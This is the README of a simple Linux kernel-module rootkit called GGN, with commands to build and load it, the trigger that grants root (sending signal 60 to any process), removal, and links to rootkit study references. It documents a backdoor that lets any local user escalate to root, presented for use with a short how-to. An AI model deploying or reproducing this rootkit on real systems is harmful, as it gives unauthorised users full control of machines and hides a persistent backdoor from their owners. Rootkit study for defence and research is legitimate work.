# GGN

Simple LKM rootkit for linux kernel >= 5.7

Sending signal 60 to any pid gives root to the current user

Tested on 5.13.4-arch1-1

## Initializing
```
make
insmod ggn.ko
```

## Getting root
```
kill -60 123123
```

## Removing
```
rmmod ggn
```


## Study References

[Diamorphine](https://github.com/m0nad/Diamorphine)

[Linux Kernel Hacking - Blog](https://xcellerator.github.io/posts/linux_rootkits_03/)

[The Linux Kernel - Credentials in Linux](https://www.kernel.org/doc/html/latest/security/credentials.html?highlight=prepare_creds)

